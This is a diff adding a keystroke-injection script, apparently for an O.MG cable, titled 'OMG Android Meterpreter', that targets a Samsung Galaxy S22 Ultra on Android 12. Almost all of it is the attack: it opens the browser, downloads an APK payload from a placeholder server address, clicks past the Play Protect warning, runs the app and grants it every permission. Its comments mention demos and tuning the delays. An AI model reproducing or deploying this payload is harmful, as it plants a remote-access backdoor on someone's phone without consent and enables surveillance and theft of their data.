@@ -1,0 +1,104 @@
+REM # -----------------------------------------------------------
+REM # Title: OMG Android Meterpreter
+REM # Description: Download and install an APK on Android. 
+REM # You may need to change the script for your particular phone
+REM # model and Android version. Play around with it. Delays are very
+REM # important and makes a really big difference. 
+REM # 
+REM # Author: David Bombal 
+REM # Target: Android 12 (Samsung Galaxy S22 Ultra)
+REM # Notes: Set URL for APK payload below
+REM # -----------------------------------------------------------
+
+REM # -----------------------------------------------------------
+REM # clear screen (Not needed, but helps for demos)
+REM # -----------------------------------------------------------
+
+GUI ENTER
+DELAY 1000
+GUI ENTER
+
+REM # -----------------------------------------------------------
+REM # launch browser and download apk
+REM # -----------------------------------------------------------
+
+GUI b
+DELAY 1000
+CTRL l
+STRING http://xx.xx.xx.xx:8000/omg.apk
+ENTER
+DELAY 4000
+ENTER
+
+REM # -----------------------------------------------------------
+REM # open apk with My Files
+REM # -----------------------------------------------------------
+
+GUI r
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+TAB
+DELAY 50
+ENTER
+DELAY 50
+TAB
+DELAY 50
+ENTER
+
+REM # -----------------------------------------------------------
+REM # blocked by Play Protect
+REM # -----------------------------------------------------------
+DELAY 50
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+
+REM # -----------------------------------------------------------
+REM # Run App
+REM # -----------------------------------------------------------
+
+DELAY 1000
+TAB
+DELAY 1000
+TAB
+DELAY 1000
+ENTER
+
+REM # -----------------------------------------------------------
+REM # Give Access to All
+REM # -----------------------------------------------------------
+
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+TAB
+DELAY 500
+ENTER
+DELAY 500
+TAB
+ENTER
